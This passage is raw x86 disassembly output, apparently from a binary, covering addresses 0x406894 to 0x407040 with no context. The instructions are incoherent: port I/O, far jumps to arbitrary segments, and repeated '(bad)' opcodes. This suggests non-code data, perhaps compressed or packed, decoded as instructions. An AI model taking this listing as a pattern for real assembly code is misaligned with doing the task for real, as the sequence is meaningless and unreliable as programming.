  406894:	shl    DWORD PTR ds:0x42b2e15c,0x1d
  40689b:	sbb    DWORD PTR [ebp-0x26],esp
  40689e:	xchg   esp,edi
  4068a0:	cmp    DWORD PTR ds:0x75318936,0xd9c50cf0
  4068aa:	std    
  4068ab:	pop    edi
  4068ac:	jae    0x4068e3
  4068ae:	in     eax,dx
  4068af:	leave  
  4068b0:	push   ebp
  4068b1:	pop    ds
  4068b2:	pop    ds
  4068b3:	fidivr DWORD PTR [eax+ecx*4-0xae7e1f9]
  4068ba:	js     0x40684d
  4068bc:	or     DWORD PTR [ebx],esi
  4068be:	pop    ss
  4068bf:	adc    BYTE PTR [ecx+0x10],dl
  4068c2:	xchg   esp,eax
  4068c3:	sub    al,0x19
  4068c5:	xor    eax,0xb1a1c6db
  4068ca:	leave  
  4068cb:	outs   dx,BYTE PTR ds:[esi]
  4068cc:	jnp    0x4068e3
  4068ce:	mov    eax,ds:0x7c939d36
  4068d3:	imul   esp,DWORD PTR [ebp+ebx*4+0x1c],0xe251371a
  4068db:	stos   DWORD PTR es:[edi],eax
  4068dc:	rol    BYTE PTR [edx+eax*4+0x6f],1
  4068e0:	je     0x406866
  4068e2:	or     DWORD PTR [ebx-0x69],ebx
  4068e5:	je     0x4068ef
  4068e7:	fldcw  WORD PTR ds:0xe06ac584
  4068ed:	add    al,0x97
  4068ef:	mov    ebp,0xdaf876
  4068f4:	int3   
  4068f5:	imul   edx,DWORD PTR [esi],0x5
  4068f8:	outs   dx,BYTE PTR ds:[esi]
  4068f9:	pop    edi
  4068fa:	scas   al,BYTE PTR es:[edi]
  4068fb:	in     eax,dx
  4068fc:	fisttp DWORD PTR [edi-0x28]
  4068ff:	adc    BYTE PTR [eax],ch
  406901:	sub    al,0x42
  406903:	cmp    al,0x4f
  406905:	scas   eax,DWORD PTR es:[edi]
  406906:	out    0xe6,al
  406908:	pop    edi
  406909:	cli    
  40690a:	out    0x96,eax
  40690c:	pop    edi
  40690d:	and    dl,al
  40690f:	inc    edi
  406910:	inc    esi
  406911:	ins    BYTE PTR es:[edi],dx
  406912:	xchg   esp,eax
  406913:	push   eax
  406914:	loop   0x40691f
  406916:	bnd jae 0x4068b3
  406919:	mov    ch,0x52
  40691b:	jmp    0x19c8e8b6
  406920:	call   0xad81:0x2f328998
  406927:	fs repz pop ecx
  40692a:	js     0x4068f1
  40692c:	adc    eax,0xf91f2d4b
  406931:	inc    ebp
  406932:	pop    ss
  406933:	mov    eax,0x756462ca
  406938:	scas   ax,WORD PTR es:[edi]
  40693a:	xchg   ecx,eax
  40693b:	jmp    0xcdc7:0x87edea6a
  406942:	and    BYTE PTR [edi],al
  406944:	pop    edx
  406945:	inc    ebp
  406946:	sti    
  406947:	push   eax
  406948:	lahf   
  406949:	scas   al,BYTE PTR es:[edi]
  40694a:	pop    eax
  40694b:	lods   eax,DWORD PTR ds:[esi]
  40694c:	iret   
  40694d:	inc    ebx
  40694e:	bound  esp,QWORD PTR [esi-0x4c59b450]
  406954:	mov    ds:0x97a990e3,al
  406959:	or     al,0x39
  40695b:	shr    BYTE PTR [esi-0x6b39c174],cl
  406961:	dec    esp
  406962:	jp     0x4068f3
  406964:	mov    ecx,0xa3842163
  406969:	out    0xca,al
  40696b:	and    ah,cl
  40696d:	retf   0x937e
  406970:	xor    BYTE PTR [eax],bh
  406972:	(bad)  
  406973:	pop    edx
  406974:	in     eax,dx
  406975:	stos   DWORD PTR es:[edi],eax
  406976:	push   eax
  406977:	jg     0x406976
  406979:	(bad)  
  40697a:	cmp    ebx,DWORD PTR [eax+0x239295b9]
  406980:	or     eax,0x804d227c
  406985:	pop    esi
  406986:	add    al,dl
  406988:	jae    0x40694b
  40698a:	lds    ebp,FWORD PTR [edi]
  40698c:	and    DWORD PTR [eax-0x3a],ebx
  40698f:	jb     0x406915
  406991:	ss pop ds
  406993:	or     ebp,esi
  406995:	retf   
  406996:	xchg   edi,eax
  406997:	inc    edx
  406998:	dec    esi
  406999:	sar    DWORD PTR [eax],0x8
  40699c:	or     eax,0x3c1f0891
  4069a1:	xor    al,0x47
  4069a3:	faddp  st(0),st
  4069a5:	pop    edi
  4069a6:	cmp    DWORD PTR [edx],edx
  4069a8:	mov    cl,0x4
  4069aa:	mov    ebx,0x4c2b490a
  4069af:	adc    eax,0x3f2652df
  4069b4:	test   esi,edx
  4069b6:	lods   eax,DWORD PTR ds:[esi]
  4069b7:	mov    ch,0xb3
  4069b9:	or     edx,DWORD PTR [edx]
  4069bb:	loope  0x40698c
  4069bd:	inc    esp
  4069be:	dec    ebx
  4069bf:	call   0xc008a024
  4069c4:	dec    ebx
  4069c5:	(bad)  
  4069c6:	jae    0x4069a8
  4069c8:	scas   al,BYTE PTR es:[edi]
  4069c9:	and    edi,DWORD PTR [ebp-0xe]
  4069cc:	mov    dh,0xb2
  4069ce:	stos   BYTE PTR es:[edi],al
  4069cf:	or     eax,0x2de0fa47
  4069d4:	adc    DWORD PTR [edi+0x20],ecx
  4069d7:	outs   dx,BYTE PTR ds:[esi]
  4069d8:	dec    ecx
  4069d9:	into   
  4069da:	test   eax,0x2ba0ef1d
  4069df:	lods   eax,DWORD PTR ds:[esi]
  4069e0:	adc    al,0x99
  4069e2:	push   0xa275dad1
  4069e7:	mov    ebx,0x82e71e61
  4069ec:	sbb    eax,0xda9810a2
  4069f1:	cmp    al,0x70
  4069f3:	add    edi,DWORD PTR [esi+0x53e7d9a6]
  4069f9:	lahf   
  4069fa:	xchg   ebx,eax
  4069fb:	adc    DWORD PTR [edi-0x31eaaf9b],ecx
  406a01:	jnp    0x406a47
  406a03:	adc    BYTE PTR [edx+0x57],dh
  406a06:	sub    ah,cl
  406a08:	jo     0x406a49
  406a0a:	in     al,dx
  406a0b:	adc    eax,0x27991a91
  406a10:	add    al,ah
  406a12:	(bad)  
  406a13:	adc    DWORD PTR [edi-0x3c],edi
  406a16:	je     0x4069fd
  406a18:	pop    ss
  406a19:	and    ah,al
  406a1b:	dec    edx
  406a1c:	daa    
  406a1d:	popa   
  406a1e:	dec    esp
  406a1f:	mov    ebx,0x499c68fd
  406a24:	mov    WORD PTR [edx],gs
  406a26:	add    BYTE PTR [ebx+0x50],ah
  406a29:	dec    ebp
  406a2a:	ror    dl,1
  406a2c:	int    0xd0
  406a2e:	push   esp
  406a2f:	div    DWORD PTR [edx-0x5e362680]
  406a35:	mov    cl,0x24
  406a37:	loop   0x406a06
  406a39:	mov    bh,0xec
  406a3b:	cmp    al,BYTE PTR [ebx-0x1ea9fa4d]
  406a41:	shl    DWORD PTR [ebx+ecx*2+0x56a6974c],1
  406a48:	mov    ch,0x15
  406a4a:	add    bl,0xa5
  406a4d:	add    esi,DWORD PTR [edi+ebp*1]
  406a50:	fdivr  QWORD PTR [eax]
  406a52:	dec    edx
  406a53:	pop    edx
  406a54:	lock jp 0x406a35
  406a57:	mov    gs,WORD PTR [ebx]
  406a59:	dec    ebx
  406a5a:	pop    es
  406a5b:	ja     0x406ad4
  406a5d:	adc    DWORD PTR [esp+ebx*4+0x3188ba08],edx
  406a64:	cs popa 
  406a66:	sbb    esp,DWORD PTR [edi-0x45e89790]
  406a6c:	or     ch,BYTE PTR [ebx-0x45db77c2]
  406a72:	push   DWORD PTR [ecx]
  406a74:	pop    ebx
  406a75:	sbb    bl,bh
  406a77:	dec    esi
  406a78:	mov    ebp,0x133d4207
  406a7d:	rol    DWORD PTR [edi-0x7ac4a54e],1
  406a83:	out    0xa0,eax
  406a85:	xor    DWORD PTR [ebp+0x3fb40aab],ebp
  406a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a8c:	mov    al,0x97
  406a8e:	push   0xffffffe9
  406a90:	sahf   
  406a91:	sub    al,0x82
  406a93:	dec    edx
  406a94:	jg     0x406a92
  406a96:	add    edi,DWORD PTR [ecx]
  406a98:	scas   eax,DWORD PTR es:[edi]
  406a99:	(bad)  
  406a9a:	nop
  406a9b:	(bad)  
  406a9c:	sbb    edi,DWORD PTR [ebp+0x2c044e84]
  406aa2:	jmp    0x42195895
  406aa7:	stc    
  406aa8:	retf   
  406aa9:	fmul   DWORD PTR [esi]
  406aab:	fdivr  QWORD PTR [esi-0x5f0299db]
  406ab1:	push   esp
  406ab2:	pop    ebp
  406ab3:	sbb    DWORD PTR [esi-0x73],ebp
  406ab6:	ja     0x406a65
  406ab8:	cmp    DWORD PTR [esi],0xc28d5f0a
  406abe:	fwait
  406abf:	sbb    BYTE PTR [ebp+0x23],dh
  406ac2:	loop   0x406b40
  406ac4:	mov    edx,DWORD PTR [edx]
  406ac6:	mov    edx,0xf4932eee
  406acb:	in     al,dx
  406acc:	sbb    BYTE PTR [ecx-0x63ac09cc],bh
  406ad2:	jg     0x406b10
  406ad4:	jno    0x406ad5
  406ad6:	cwde   
  406ad7:	jge    0x406a6a
  406ad9:	mov    ch,BYTE PTR [edx-0x44]
  406adc:	push   ds
  406add:	lahf   
  406ade:	xchg   edx,eax
  406adf:	clc    
  406ae0:	inc    ebx
  406ae1:	or     ah,BYTE PTR [ecx-0x64]
  406ae4:	cmp    eax,0x7c936d60
  406ae9:	adc    BYTE PTR [edi-0x3d],0x96
  406aed:	sbb    BYTE PTR [edx-0x73],0x6f
  406af1:	leave  
  406af2:	mov    BYTE PTR [eax+0x52],dl
  406af5:	and    edx,DWORD PTR [esi]
  406af7:	cmp    al,0x94
  406af9:	jb     0x406af7
  406afb:	push   ds
  406afc:	ret    
  406afd:	fs mov ebx,0x2e0abeb3
  406b03:	loope  0x406b32
  406b05:	ret    0x9d18
  406b08:	xchg   esi,eax
  406b09:	xchg   ebx,eax
  406b0a:	mov    esi,0xb865379b
  406b0f:	or     eax,0x5b4dc7c1
  406b14:	sbb    al,0x8c
  406b16:	add    DWORD PTR [edx],edx
  406b18:	pop    esi
  406b19:	cmp    bh,BYTE PTR [ebp-0x2e]
  406b1c:	push   ebx
  406b1d:	push   ebp
  406b1e:	in     eax,0x73
  406b20:	pop    es
  406b21:	mov    cl,0x0
  406b23:	pop    edx
  406b24:	mov    eax,cs
  406b26:	leave  
  406b27:	out    0x18,eax
  406b29:	pop    edx
  406b2a:	fdivr  DWORD PTR [ecx]
  406b2c:	test   eax,0x9d3f8c84
  406b31:	pop    eax
  406b32:	mov    dl,0xfd
  406b34:	inc    eax
  406b36:	push   ebx
  406b37:	mov    ds:0x399bfe9d,al
  406b3c:	lea    esp,[ebx+ebx*4-0x31a6f7e8]
  406b43:	xchg   ebx,eax
  406b44:	push   ecx
  406b45:	fnsave ss:[edi]
  406b48:	and    cl,dl
  406b4a:	xor    eax,0xfd8b1cda
  406b4f:	shl    DWORD PTR [ebx+0x6e3145cc],1
  406b55:	xchg   ecx,eax
  406b56:	(bad)  
  406b57:	(bad)  
  406b58:	scas   al,BYTE PTR es:[edi]
  406b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b5a:	popf   
  406b5b:	sub    ecx,DWORD PTR ds:0x13cd5550
  406b61:	push   ss
  406b62:	adc    dl,BYTE PTR [edi]
  406b64:	jbe    0x406bb4
  406b66:	adc    dh,BYTE PTR [edx+0x9]
  406b69:	cld    
  406b6a:	pop    ss
  406b6b:	shr    DWORD PTR [ebx],1
  406b6d:	sar    DWORD PTR [ebp-0x13],1
  406b70:	add    ecx,esi
  406b72:	or     bl,bl
  406b74:	mov    cl,0xdd
  406b76:	pop    es
  406b77:	jg     0x406ba1
  406b79:	jmp    0x406bbf
  406b7b:	and    dl,ah
  406b7d:	cld    
  406b7e:	inc    ebx
  406b7f:	jmp    0x705:0xfbb3d81f
  406b86:	adc    eax,0x3a79be91
  406b8b:	hlt    
  406b8c:	dec    DWORD PTR [ebx]
  406b8e:	pushf  
  406b8f:	jbe    0x406b80
  406b91:	xchg   ebp,eax
  406b92:	or     edx,DWORD PTR [ebp+0x75b379f4]
  406b98:	rol    BYTE PTR cs:[esi],cl
  406b9b:	mov    edi,0x7445cebb
  406ba0:	ror    BYTE PTR [eax-0x3e],0x2a
  406ba4:	les    esi,FWORD PTR [edi+0x25]
  406ba7:	and    DWORD PTR [edx-0x4c],ebx
  406baa:	mov    edi,0xb0b54c6e
  406baf:	push   esp
  406bb0:	sub    al,0x1c
  406bb2:	push   0xb7fd8d5a
  406bb7:	test   DWORD PTR ds:0xef65d02e,0xcb1de6f3
  406bc1:	aam    0x13
  406bc3:	ficomp DWORD PTR [edx+0x1248f6a5]
  406bc9:	ja     0x406ba4
  406bcb:	test   DWORD PTR [ecx+eax*4+0x68876a87],0x9845d573
  406bd6:	stos   BYTE PTR es:[edi],al
  406bd7:	je     0x406c33
  406bd9:	mov    al,ds:0xd0a764e9
  406bde:	retf   
  406bdf:	adc    BYTE PTR [eax+0x7b],0x90
  406be3:	fimul  WORD PTR [ebx]
  406be5:	pop    ecx
  406be6:	pusha  
  406be7:	jmp    0x27829d52
  406bec:	dec    ebx
  406bed:	sbb    edi,DWORD PTR [ebx+0x78e68707]
  406bf3:	mov    WORD PTR [esi-0x2a],es
  406bf6:	xchg   BYTE PTR [edi],bh
  406bf8:	mov    ebp,0x4a71dbea
  406bfd:	jmp    0xc3b8:0xacf53ed0
  406c04:	fst    st(1)
  406c06:	out    dx,al
  406c07:	mov    eax,ds:0x8d3c363f
  406c0c:	pop    esi
  406c0d:	es jmp 0x406bd3
  406c10:	xor    bh,BYTE PTR [ecx]
  406c12:	fist   DWORD PTR [eax+0x7]
  406c15:	pop    esi
  406c16:	sub    DWORD PTR [edx],0x37
  406c19:	(bad)  
  406c1a:	push   esi
  406c1b:	mov    ds,WORD PTR [esi+ebx*1+0x20]
  406c1f:	mov    ds:0xf911d838,eax
  406c24:	adc    ebx,ebx
  406c26:	outs   dx,BYTE PTR ds:[esi]
  406c27:	ja     0x406bb1
  406c29:	cmp    edi,DWORD PTR [edi+ebp*8+0x67]
  406c2d:	inc    ebp
  406c2e:	std    
  406c2f:	pop    ss
  406c30:	jnp    0x406c2c
  406c32:	adc    eax,0x4fcae5a4
  406c37:	cmc    
  406c38:	(bad)  
  406c39:	mov    ebx,0x9a9a2f0c
  406c3e:	and    DWORD PTR [edi-0x33d56dd5],ebx
  406c44:	or     BYTE PTR [edx+ebp*1],ch
  406c47:	outs   dx,DWORD PTR ds:[esi]
  406c48:	data16 mov al,ds:0x49cc2bd6
  406c4e:	(bad)  
  406c4f:	xchg   ecx,eax
  406c50:	and    BYTE PTR [ebp+0x4abe72df],bh
  406c56:	imul   ecx,DWORD PTR [ecx-0x19],0x5c6ac163
  406c5d:	fdiv   DWORD PTR [ebp-0x67]
  406c60:	test   al,0x4f
  406c62:	push   ecx
  406c63:	test   DWORD PTR [ebx-0x3325706e],edi
  406c69:	mov    edi,0x3c84b144
  406c6e:	aaa    
  406c6f:	pop    edx
  406c70:	cld    
  406c71:	and    BYTE PTR [edi-0x58],dl
  406c74:	mov    bh,0x66
  406c77:	sub    DWORD PTR [esi+eax*2+0x3a0e4c37],0xffffffd6
  406c7f:	xchg   edi,eax
  406c80:	ins    DWORD PTR es:[edi],dx
  406c81:	cmp    bl,bl
  406c83:	out    dx,al
  406c84:	xorps  xmm6,XMMWORD PTR [ebp-0x1db1b56e]
  406c8b:	dec    edx
  406c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c8d:	sub    al,0x60
  406c8f:	push   ss
  406c90:	ss das 
  406c92:	div    BYTE PTR [esi-0x52]
  406c95:	in     al,dx
  406c96:	mov    ah,0xae
  406c98:	adc    ch,BYTE PTR [eax-0xd]
  406c9b:	imul   esp,DWORD PTR [edx-0x7c71a87],0x74a7da9c
  406ca5:	loop   0x406c42
  406ca7:	pop    ebp
  406ca8:	in     al,dx
  406ca9:	ins    DWORD PTR es:[edi],dx
  406caa:	xor    ebx,DWORD PTR [esi+0xa]
  406cad:	(bad)  
  406cae:	out    dx,eax
  406caf:	mov    al,ds:0xe61b0ef8
  406cb4:	and    ecx,DWORD PTR [edi+0x2b26a3e]
  406cba:	dec    BYTE PTR ss:0x5614a1fe
  406cc1:	jbe    0x406d3c
  406cc3:	mov    al,ds:0x29f333eb
  406cc8:	in     eax,0x1d
  406cca:	sahf   
  406ccb:	add    BYTE PTR [edx],0xd9
  406cce:	lahf   
  406ccf:	and    DWORD PTR ds:0xb44da969,esi
  406cd5:	sbb    eax,0xc3b1e380
  406cda:	dec    BYTE PTR [ebx+0xaf00ccd]
  406ce0:	test   eax,0x3d47f822
  406ce5:	shl    BYTE PTR [ebx-0x52],1
  406ce8:	mov    eax,ds:0x44e0f50b
  406ced:	xlat   BYTE PTR ds:[ebx]
  406cee:	sub    eax,0x45c21f77
  406cf3:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf5:	jbe    0x406c77
  406cf7:	pop    es
  406cf8:	in     eax,dx
  406cf9:	push   0x1c
  406cfb:	retf   
  406cfc:	jne    0x406cae
  406cfe:	push   ds
  406cff:	sbb    dl,BYTE PTR [ebp-0x6]
  406d02:	cmp    eax,0xff4a1634
  406d08:	jl     0x406d46
  406d0a:	push   ss
  406d0b:	sub    dl,BYTE PTR [esi-0x619c52e3]
  406d11:	mov    ds:0xf5c1cc47,eax
  406d16:	mov    al,ds:0xb3969793
  406d1b:	inc    eax
  406d1c:	lds    ecx,FWORD PTR [ecx+edi*1]
  406d1f:	mov    dh,0x71
  406d21:	and    al,0x1c
  406d23:	xchg   edi,eax
  406d24:	(bad)  
  406d25:	lock nop
  406d27:	mov    esi,0x47361bcd
  406d2c:	out    dx,al
  406d2d:	mov    ds:0xacb9d1bb,eax
  406d32:	bound  ebx,QWORD PTR [eax+ebx*4]
  406d35:	adc    edi,DWORD PTR [eax+0x5fcdc432]
  406d3b:	xor    BYTE PTR [edi-0x2782565b],cl
  406d41:	inc    ebx
  406d42:	test   eax,0xf8ea254f
  406d47:	stos   BYTE PTR es:[edi],al
  406d48:	mov    edx,0x4353e17b
  406d4d:	inc    esp
  406d4e:	test   BYTE PTR [ebx+edx*4],bl
  406d51:	jbe    0x406d65
  406d53:	mov    al,ds:0xf0918a3c
  406d58:	mov    ds:0x71b19847,al
  406d5d:	mov    dl,0x92
  406d5f:	xor    ecx,DWORD PTR [esi-0xb]
  406d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d63:	cmp    al,0x92
  406d65:	fwait
  406d66:	(bad)  
  406d67:	in     eax,dx
  406d68:	bswap  ecx
  406d6a:	test   DWORD PTR [edx+0x69],ebp
  406d6d:	iret   
  406d6e:	sbb    al,0x96
  406d70:	aam    0xd3
  406d72:	push   ebp
  406d73:	in     al,0x18
  406d75:	jno    0x406d4a
  406d77:	push   ebp
  406d78:	stos   DWORD PTR es:[edi],eax
  406d79:	pop    edi
  406d7a:	sub    cl,BYTE PTR [ebx]
  406d7c:	bound  ecx,QWORD PTR ds:0xa1f5439c
  406d82:	inc    BYTE PTR [edx-0x17cf5cba]
  406d88:	sti    
  406d89:	adc    eax,0xf3144b1f
  406d8e:	stos   DWORD PTR es:[edi],eax
  406d8f:	pop    es
  406d90:	jns    0x406d3e
  406d92:	or     dl,BYTE PTR [eax-0x468651b6]
  406d98:	bound  ecx,QWORD PTR [eax-0x72]
  406d9b:	dec    edx
  406d9c:	cmp    eax,0x5c1b347a
  406da1:	bound  edx,QWORD PTR [edx-0x68]
  406da4:	stos   DWORD PTR es:[edi],eax
  406da5:	sbb    al,0x5
  406da7:	add    eax,0x1d8e845e
  406dac:	sar    BYTE PTR [eax-0x5b6b9b60],1
  406db2:	mov    ds:0x22049105,eax
  406db7:	pop    ebp
  406db8:	inc    ebp
  406db9:	jp     0x406dbc
  406dbb:	push   ds
  406dbc:	ins    BYTE PTR es:[edi],dx
  406dbd:	loopne 0x406e07
  406dbf:	(bad)  
  406dc0:	in     eax,dx
  406dc1:	pusha  
  406dc2:	pusha  
  406dc3:	inc    ebx
  406dc4:	adc    al,0xdc
  406dc6:	icebp  
  406dc7:	popw   es
  406dc9:	xchg   edi,eax
  406dca:	test   al,0x9b
  406dcc:	xchg   edx,eax
  406dcd:	cmp    al,0xe1
  406dcf:	aam    0x7b
  406dd1:	push   eax
  406dd2:	jo     0x406dca
  406dd4:	repz xchg esi,ebx
  406dd7:	push   ss
  406dd8:	jge    0x406d9a
  406dda:	hlt    
  406ddb:	sahf   
  406ddc:	jmp    0x406dcd
  406dde:	add    DWORD PTR [edi+0x1b],esi
  406de1:	lea    ebp,[ebx]
  406de3:	test   eax,ebp
  406de5:	xor    DWORD PTR [edx+0x3e],esi
  406de8:	mov    al,ds:0xe9ed2fb7
  406ded:	and    DWORD PTR [eax+0x10],esi
  406df0:	mov    DWORD PTR [ebx-0x1a31e438],ebx
  406df6:	loopne 0x406dec
  406df8:	lods   al,BYTE PTR ds:[esi]
  406df9:	cmp    ah,bh
  406dfb:	outs   dx,BYTE PTR ds:[esi]
  406dfc:	inc    ebp
  406dfd:	push   ebp
  406dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dff:	sbb    BYTE PTR [eax],cl
  406e01:	jle    0x406e4f
  406e03:	cmp    BYTE PTR [eax],dl
  406e05:	cmp    BYTE PTR [edi],dl
  406e07:	(bad)  
  406e08:	or     DWORD PTR [ebx-0x57],0xffffff9b
  406e0c:	sub    DWORD PTR [ebx+0x113b80a6],esp
  406e12:	jo     0x406d9b
  406e14:	fwait
  406e15:	sbb    ecx,DWORD PTR [eax-0x60]
  406e18:	(bad)  
  406e19:	sbb    al,0x60
  406e1b:	or     al,0x40
  406e1d:	adc    eax,0xb27dd64e
  406e22:	stc    
  406e23:	js     0x406e40
  406e25:	xor    al,0x16
  406e27:	and    ebx,DWORD PTR [esi+0x72]
  406e2a:	sub    eax,0x5c33a16e
  406e2f:	jp     0x406df0
  406e31:	enter  0x9bca,0xef
  406e35:	aas    
  406e36:	dec    edi
  406e37:	pusha  
  406e38:	dec    esi
  406e39:	dec    ebp
  406e3a:	push   ebx
  406e3b:	mov    ch,0xa8
  406e3d:	stc    
  406e3e:	cmp    BYTE PTR [esi+0x4],dh
  406e41:	add    esp,edx
  406e43:	inc    eax
  406e44:	push   es
  406e45:	jnp    0x406e78
  406e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e48:	and    ah,bl
  406e4a:	aas    
  406e4b:	fnstcw WORD PTR [ecx+esi*4-0x689a7960]
  406e52:	shl    DWORD PTR [esi-0x4d23c81d],0x0
  406e59:	mov    ds:0x419465d4,eax
  406e5e:	push   ecx
  406e5f:	mov    ds:0x308c5ab7,al
  406e64:	mov    ebx,0xcd12bcab
  406e69:	call   0x9011822
  406e6e:	popf   
  406e6f:	fdiv   DWORD PTR [esi]
  406e71:	adc    dl,BYTE PTR [ebx+0x28]
  406e74:	jp     0x406e21
  406e76:	jge    0x406e49
  406e78:	push   esi
  406e79:	push   eax
  406e7a:	js     0x406e22
  406e7c:	iret   
  406e7d:	or     bl,BYTE PTR [ebx]
  406e7f:	fdiv   QWORD PTR [edx]
  406e81:	cmp    al,BYTE PTR [eax+0x6b]
  406e84:	cs add eax,0x227b8ac9
  406e8a:	add    dl,dh
  406e8c:	jle    0x406f0a
  406e8e:	(bad)  
  406e8f:	faddp  st(7),st
  406e91:	jmp    0x77ff:0xb33dd9f5
  406e98:	adc    ah,bl
  406e9a:	adc    DWORD PTR ds:0xef48ef2,0xffffffa0
  406ea1:	pop    ss
  406ea2:	xchg   edi,eax
  406ea3:	mov    edi,0x3fa6d2bb
  406ea8:	clc    
  406ea9:	mov    esp,0x6eb434a1
  406eae:	or     al,0x7a
  406eb0:	mov    ds:0x36ed0165,eax
  406eb5:	xor    al,0xe2
  406eb7:	jbe    0x406e7e
  406eb9:	cmp    DWORD PTR [ecx],ebp
  406ebb:	(bad)  
  406ebc:	icebp  
  406ebd:	xchg   ecx,eax
  406ebe:	(bad)  [eax]
  406ec0:	scas   al,BYTE PTR es:[edi]
  406ec1:	inc    esi
  406ec2:	push   ss
  406ec3:	sub    edi,DWORD PTR [eax+0x46]
  406ec6:	test   BYTE PTR [edi],ah
  406ec8:	mov    dl,BYTE PTR [ebp-0x72deefb6]
  406ece:	mov    edx,0xe8e366b0
  406ed3:	fs retf 0x81c0
  406ed7:	jmp    0xa445f121
  406edc:	sbb    BYTE PTR [ebx+0x70],ah
  406edf:	mov    bl,0x3d
  406ee1:	xchg   ecx,eax
  406ee2:	iret   
  406ee3:	mov    edx,0x30419d09
  406ee8:	xchg   ebp,eax
  406ee9:	xchg   ecx,eax
  406eea:	push   esi
  406eeb:	out    dx,al
  406eec:	inc    ecx
  406eed:	retf   0xaf80
  406ef0:	test   BYTE PTR [esp+ecx*4+0x44eb54d7],ch
  406ef7:	enter  0xdec3,0x81
  406efb:	arpl   WORD PTR [ebx+ebx*4],bp
  406efe:	or     BYTE PTR [ebx-0x9],ch
  406f01:	xchg   esp,eax
  406f02:	out    0x8d,eax
  406f04:	jno    0x406f4b
  406f06:	dec    ecx
  406f07:	cmp    dh,BYTE PTR [edx-0xc]
  406f0a:	mov    BYTE PTR [eax+0x55dc0a80],dl
  406f10:	jcxz   0x406f0d
  406f13:	inc    esp
  406f14:	mov    edi,edx
  406f16:	or     al,0xa3
  406f18:	mov    bh,0xb5
  406f1a:	pop    edx
  406f1b:	pop    esi
  406f1c:	dec    edi
  406f1d:	cmp    eax,0x12b69df4
  406f22:	push   ds
  406f23:	adc    ch,dh
  406f25:	stos   BYTE PTR es:[edi],al
  406f26:	mov    esi,0x60d8738d
  406f2b:	jb     0x406ee4
  406f2d:	sbb    BYTE PTR [ecx+0x63baeb3f],dl
  406f33:	out    dx,al
  406f34:	jno    0x406f13
  406f36:	aam    0xa5
  406f38:	mov    bh,0xb4
  406f3a:	push   0x78
  406f3c:	pop    edi
  406f3d:	aam    0xee
  406f3f:	daa    
  406f40:	stos   BYTE PTR es:[edi],al
  406f41:	mov    edi,0x4ec519a5
  406f46:	push   ss
  406f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f48:	das    
  406f49:	push   esp
  406f4a:	inc    esi
  406f4b:	stos   BYTE PTR es:[edi],al
  406f4c:	rol    DWORD PTR [ecx],1
  406f4e:	ds in  al,dx
  406f50:	ja     0x406f7b
  406f52:	inc    edi
  406f53:	fldenv [edx+0x5ff62cf9]
  406f59:	or     ah,BYTE PTR [edx+edx*1]
  406f5c:	push   esp
  406f5d:	or     eax,0x33009ad9
  406f62:	and    DWORD PTR [edi-0x5e242903],0x831b63b3
  406f6c:	lods   al,BYTE PTR ds:[esi]
  406f6d:	repz or BYTE PTR [edi+0x24],dl
  406f71:	or     dl,al
  406f73:	and    edx,esp
  406f75:	fld    QWORD PTR [esi+edi*2+0x6753df65]
  406f7c:	or     eax,0x79533e46
  406f81:	adc    al,BYTE PTR [edx]
  406f83:	repz mov dl,BYTE PTR [edi+0x2e]
  406f87:	adc    eax,0xdfa30ea8
  406f8c:	inc    edi
  406f8d:	or     bh,BYTE PTR [edi+0x31faaade]
  406f93:	ret    0xe12e
  406f96:	loop   0x406f78
  406f98:	sub    DWORD PTR ds:[edi+0x57],ecx
  406f9c:	ds ja  0x406fcc
  406f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fa0:	icebp  
  406fa1:	scas   eax,DWORD PTR es:[edi]
  406fa2:	push   0x84244e9d
  406fa7:	lods   eax,DWORD PTR ds:[esi]
  406fa8:	(bad)  [edi+eax*2-0x2b]
  406fac:	mov    edi,0xd4a82b3d
  406fb1:	cmc    
  406fb2:	dec    eax
  406fb3:	mov    ch,0xdb
  406fb5:	je     0x407031
  406fb7:	sbb    al,0xc1
  406fb9:	jo     0x406f93
  406fbb:	jmp    0x407005
  406fbd:	ds std 
  406fbf:	adc    ebp,DWORD PTR ds:0xe4721bf5
  406fc5:	push   cs
  406fc6:	jge    0x407028
  406fc8:	lods   eax,DWORD PTR ds:[esi]
  406fc9:	outs   dx,DWORD PTR ds:[esi]
  406fca:	push   ss
  406fcb:	arpl   WORD PTR [bp+di-0x4d9d],cx
  406fd0:	aam    0xb
  406fd2:	pop    ds
  406fd3:	js     0x406fc1
  406fd5:	cmc    
  406fd6:	test   al,0x1
  406fd8:	or     eax,0xd0b3dce7
  406fdd:	sbb    DWORD PTR [ebp-0x10316f80],esi
  406fe3:	cdq    
  406fe4:	pop    es
  406fe5:	call   0xfeeb:0x847a82cb
  406fec:	dec    edx
  406fed:	inc    esp
  406fee:	cmp    BYTE PTR [edi+0xc0629b3],dh
  406ff4:	add    BYTE PTR [esi-0x3a],dh
  406ff7:	stos   DWORD PTR es:[edi],eax
  406ff8:	outs   dx,BYTE PTR ds:[esi]
  406ff9:	inc    edi
  406ffa:	(bad)  [edi+0x6e]
  406ffd:	xchg   esi,eax
  406ffe:	repnz sbb eax,esp
  407001:	popf   
  407002:	mov    ds:0xddb2c95,eax
  407007:	mov    edx,0x6a834182
  40700c:	cmp    al,0x29
  40700e:	inc    esi
  40700f:	push   ecx
  407010:	or     al,0x5d
  407012:	push   cs
  407013:	sub    ch,BYTE PTR [ebp+0x6be2087e]
  407019:	std    
  40701a:	jmp    0x5dcb4927
  40701f:	out    dx,eax
  407020:	xchg   BYTE PTR [eax],cl
  407022:	out    dx,al
  407023:	stc    
  407024:	nop
  407025:	out    dx,eax
  407026:	adc    BYTE PTR [ecx+0x1ce4e18f],0x7b
  40702d:	push   ds
  40702e:	jle    0x40704e
  407030:	(bad)  
  407031:	fcom   DWORD PTR [edi]
  407033:	in     al,dx
  407034:	sbb    DWORD PTR [edi-0x14b6ac3e],eax
  40703a:	mov    ah,0x7f
  40703c:	xchg   esp,eax
  40703d:	inc    ebp
  40703e:	ret    
  40703f:	nop
  407040:	outs   dx,BYTE PTR ds:[esi]
